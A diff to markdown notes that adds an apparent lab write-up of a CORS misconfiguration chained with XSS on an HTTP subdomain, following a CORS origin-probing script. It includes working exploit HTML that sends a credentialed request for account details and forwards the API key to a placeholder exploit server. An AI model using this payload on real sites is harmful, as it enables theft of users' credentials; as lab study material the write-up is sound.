@@ -67,3 +67,25 @@ for origin in ["https://evil.com", "null", "http://evil.TARGET.com"]:
     if r.headers.get("Access-Control-Allow-Origin") == origin:
         print(f"VULNERABLE: {origin}")
 ```
+
+## Verified Lab Solution: CORS + XSS Chain Attack
+
+**Lab #42** - SOLVED 2026-07-07
+
+### Attack Chain: HTTP Subdomain XSS + CORS Trust
+1. **CORS Misconfig**: Server trusts all subdomains regardless of protocol
+2. **XSS on HTTP subdomain**: `http://stock.TARGET/?productId=4<script>...`
+3. **CORS Request**: XSS makes XHR to `https://TARGET/accountDetails` with credentials
+4. **Exfiltration**: API key sent to exploit server
+
+### Exploit HTML
+```html
+<script>
+document.location="http://stock.TARGET/?productId=4<script>var req=new XMLHttpRequest();req.onload=function(){location='https://EXPLOIT/log?key='+this.responseText};req.open('get','https://TARGET/accountDetails',true);req.withCredentials=true;req.send();<\/script>&storeId=1";
+</script>
+```
+
+### Key Lessons
+- CORS trusting HTTP subdomains = XSS → credential theft
+- Always check for XSS on subdomains when CORS trusts *.domain
+- HTTP protocol downgrade attacks are still viable on internal subdomains
